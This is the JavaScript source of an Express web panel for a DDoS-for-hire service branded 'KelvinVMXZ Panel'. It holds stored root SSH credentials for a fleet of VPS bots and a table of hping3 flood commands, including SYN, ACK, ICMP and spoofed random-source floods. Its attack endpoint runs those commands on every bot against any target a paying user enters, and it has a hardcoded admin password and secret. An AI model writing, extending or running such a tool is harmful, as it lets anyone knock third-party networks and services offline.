const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const { Client } = require('ssh2');
const axios = require('axios');
const net = require('net');

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'kelvinvmxz-super-secret-key-2024';

// == IN-MEMORY STORAGE ==
const db = {
  users: [
    { id: 1, username: 'admin', password: bcrypt.hashSync('kelvinvmxz', 10), role: 'owner', plan: 'premium' }
  ],
  vps: [],
  plans: {},
  'attack-history': [],
  'ongoing-attacks': []
};

const loadData = (file) => db[file] || [];
const saveData = (file, data) => { db[file] = data; };
// == END STORAGE ==

app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

const authMiddleware = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token' });
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch {
    res.status(401).json({ error: 'Invalid token' });
  }
};

// Auth
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const user = loadData('users').find(u => u.username === username);
  if (!user || !bcrypt.compareSync(password, user.password)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  const token = jwt.sign({ id: user.id, username: user.username, role: user.role, plan: user.plan }, JWT_SECRET);
  res.json({ token, user: { username: user.username, role: user.role, plan: user.plan } });
});

// VPS
app.get('/api/vps', authMiddleware, (req, res) => res.json(loadData('vps')));
app.post('/api/vps', authMiddleware, (req, res) => {
  if (!['owner', 'admin'].includes(req.user.role)) return res.status(403).json({ error: 'Admin only' });
  const vpsList = loadData('vps');
  const newVPS = { id: Date.now(), ...req.body, status: 'unknown' };
  vpsList.push(newVPS);
  saveData('vps', vpsList);
  res.json({ success: true });
});
app.delete('/api/vps/:id', authMiddleware, (req, res) => {
  if (!['owner', 'admin'].includes(req.user.role)) return res.status(403).json({ error: 'Admin only' });
  const vpsList = loadData('vps');
  const filtered = vpsList.filter(v => v.id !== parseInt(req.params.id));
  saveData('vps', filtered);
  res.json({ success: true });
});

// Attack methods
const attackMethods = {
  'syn-pps': (t, p, s) => `sudo timeout ${s}s hping3 -S --flood -p ${p} ${t}`,
  'syn-gbps': (t, p, s) => `sudo timeout ${s}s hping3 -S --flood --data 65495 -p ${p} ${t}`,
  'ack-pps': (t, p, s) => `sudo timeout ${s}s hping3 -A --flood -p ${p} ${t}`,
  'ack-gbps': (t, p, s) => `sudo timeout ${s}s hping3 -A --flood --data 65495 -p ${p} ${t}`,
  'icmp-pps': (t, p, s) => `sudo timeout ${s}s hping3 --icmp --flood ${t}`,
  'icmp-gbps': (t, p, s) => `sudo timeout ${s}s hping3 --icmp --flood --data 65495 ${t}`,
  'rand-udp': (t, p, s) => `sudo timeout ${s}s hping3 --udp --flood --rand-source -p ${p} ${t}`,
  'rand-syn': (t, p, s) => `sudo timeout ${s}s hping3 -S --flood --rand-source -p ${p} ${t}`,
  'oblivion': (t, p, s) => `sudo timeout ${s}s hping3 -S -A -F -P -U --flood --rand-source -p ${p} ${t}`
};

app.post('/api/attack', authMiddleware, async (req, res) => {
  const { target, port, time, method } = req.body;
  if (!target || !port || !time || !method) return res.status(400).json({ error: 'Missing params' });
  if (!attackMethods[method]) return res.status(400).json({ error: 'Invalid method' });
  if (req.user.plan === 'free') return res.status(403).json({ error: 'Premium only' });

  const vpsList = loadData('vps');
  if (!vpsList.length) return res.status(400).json({ error: 'No VPS' });

  const command = attackMethods[method](target, port, time);
  const attackId = Date.now().toString();
  const ongoing = loadData('ongoing-attacks');
  const attack = { id: attackId, user: req.user.username, target: `${target}:${port}`, method: method.toUpperCase(), time: `${time}s`, startTime: new Date().toISOString(), status: 'RUNNING' };
  ongoing.push(attack);
  saveData('ongoing-attacks', ongoing);

  let success = 0;
  const vpsResults = [];
  for (const vps of vpsList) {
    try {
      await new Promise((resolve) => {
        const conn = new Client();
        conn.on('ready', () => {
          const screenName = `attack_${attackId}_${Math.random().toString(36).substr(2, 9)}`;
          conn.exec(`screen -dmS ${screenName} bash -c "${command}; sleep 1"`, (err) => {
            if (!err) { success++; vpsResults.push({ host: vps.host, success: true }); } else { vpsResults.push({ host: vps.host, success: false, error: err.message }); }
            conn.end(); resolve();
          });
        }).on('error', () => { vpsResults.push({ host: vps.host, success: false }); resolve(); })
          .connect({ host: vps.host, username: vps.username || 'root', password: vps.password, readyTimeout: 10000 });
      });
    } catch { vpsResults.push({ host: vps.host, success: false }); }
  }

  attack.status = 'COMPLETED'; attack.endTime = new Date().toISOString(); attack.vpsResults = vpsResults;
  const history = loadData('attack-history'); history.push(attack); saveData('attack-history', history);
  saveData('ongoing-attacks', ongoing.filter(a => a.id !== attackId));

  res.json({ success: true, results: { success, failed: vpsList.length - success, total: vpsList.length, vpsResults } });
});

// Stop all attacks
app.post('/api/attacks/stop', authMiddleware, (req, res) => {
  if (!['owner', 'admin'].includes(req.user.role)) return res.status(403).json({ error: 'Admin only' });
  const vpsList = loadData('vps');
  for (const vps of vpsList) {
    try {
      const conn = new Client();
      conn.on('ready', () => { conn.exec('pkill -9 hping3 && pkill -f "attack_" && screen -ls | grep attack_ | cut -d. -f1 | xargs -I {} screen -X -S {} quit', () => conn.end()); })
          .connect({ host: vps.host, username: vps.username || 'root', password: vps.password });
    } catch {}
  }
  saveData('ongoing-attacks', []);
  res.json({ success: true });
});

// Other endpoints
app.get('/api/attacks/ongoing', authMiddleware, (req, res) => res.json(loadData('ongoing-attacks')));
app.get('/api/attacks/history', authMiddleware, (req, res) => res.json(loadData('attack-history').slice(-50)));
app.get('/api/stats', authMiddleware, (req, res) => {
  const vps = loadData('vps');
  const ongoing = loadData('ongoing-attacks');
  const history = loadData('attack-history');
  res.json({ vps: { total: vps.length, online: vps.filter(v => v.status === 'online').length }, attacks: { ongoing: ongoing.length, total: history.length }, users: { total: loadData('users').length, premium: Object.keys(loadData('plans')).length }, methods: Object.keys(attackMethods).length });
});

// VPS status check
app.post('/api/vps/check', authMiddleware, async (req, res) => {
  if (!['owner', 'admin'].includes(req.user.role)) return res.status(403).json({ error: 'Admin only' });
  const vpsList = loadData('vps');
  const results = [];
  for (const vps of vpsList) {
    const isAlive = await new Promise((resolve) => {
      const conn = new Client();
      conn.on('ready', () => { conn.end(); resolve(true); })
          .on('error', () => resolve(false))
          .connect({ host: vps.host, username: vps.username || 'root', password: vps.password, readyTimeout: 5000 });
    });
    vps.status = isAlive ? 'online' : 'offline';
    results.push({ host: vps.host, status: vps.status });
  }
  const onlineVPS = vpsList.filter(v => v.status === 'online');
  saveData('vps', onlineVPS);
  res.json({ checked: results, remaining: onlineVPS.length });
});

// Auto cleanup every 15s
setInterval(() => {
  const ongoing = loadData('ongoing-attacks');
  const history = loadData('attack-history');
  const now = Date.now();
  for (let i = ongoing.length - 1; i >= 0; i--) {
    const a = ongoing[i];
    const duration = parseInt(a.time) * 1000;
    if (now - new Date(a.startTime).getTime() > duration) {
      a.status = 'EXPIRED'; a.endTime = new Date().toISOString();
      history.push(a); ongoing.splice(i, 1);
    }
  }
  saveData('ongoing-attacks', ongoing);
  if (history.length > 100) saveData('attack-history', history.slice(-100));
}, 15000);

app.listen(PORT, () => console.log(`✅ KelvinVMXZ Panel running on ${PORT}`));
